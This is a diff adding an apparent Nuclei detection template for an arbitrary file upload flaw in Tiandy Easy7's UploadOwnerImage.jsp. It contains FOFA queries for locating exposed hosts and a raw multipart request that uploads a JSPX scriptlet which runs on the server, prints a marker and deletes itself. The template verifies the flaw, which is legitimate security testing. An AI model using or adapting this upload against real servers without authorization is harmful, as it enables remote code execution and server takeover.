@@ -1,0 +1,48 @@
+id: TianDiWeiYe-Easy7-UploadOwnerImage_jsp-File-Upload
+
+info:
+  name: 天地伟业Easy7 /Easy7/apps/WebService/UploadOwnerImage.jsp 任意文件上传
+  author: HuanXiong
+  severity: critical
+  description: |
+    fofa: body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"
+    天地伟业Easy7 /Easy7/apps/WebService/UploadOwnerImage.jsp 接口存在任意文件上传漏洞，攻击者可通过构造包含恶意文件的HTTP请求，利用该接口将文件上传至服务器指定目录，并可通过后续请求直接访问上传的文件，进而获取服务器权限、执行恶意代码，严重危害系统安全。
+  reference:
+    - 
+  tags: File Upload
+
+variables:
+  filename: "{{to_lower(rand_base(6))}}"
+
+http:
+  - raw:
+      - |
+        POST /Easy7/apps/WebService/UploadOwnerImage.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8fcb78c9429713c2
+
+        ------WebKitFormBoundary8fcb78c9429713c2
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jspx"
+
+        <?xml version="1.0" encoding="UTF-8"?><jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.1"><jsp:directive.page language="java" contentType="text/plain; charset=UTF-8" pageEncoding="UTF-8"/><jsp:directive.page import="java.io.File"/><jsp:scriptlet>out.print("pboyjnnrfipmplsukdeczudsefxmywe");try{String p=application.getRealPath(request.getRequestURI());File f=new File(p);if(f.exists()){f.delete();}}catch(Exception e){}</jsp:scriptlet></jsp:root>
+        ------WebKitFormBoundary8fcb78c9429713c2--
+
+      - |
+        GET /Easy7/images/uploadPics/{{upload_filename}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
+
+    extractors:
+      - type: regex
+        name: upload_filename
+        internal: true
+        part: body
+        regex:
+          - '\d+_\d+\.jspx'
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
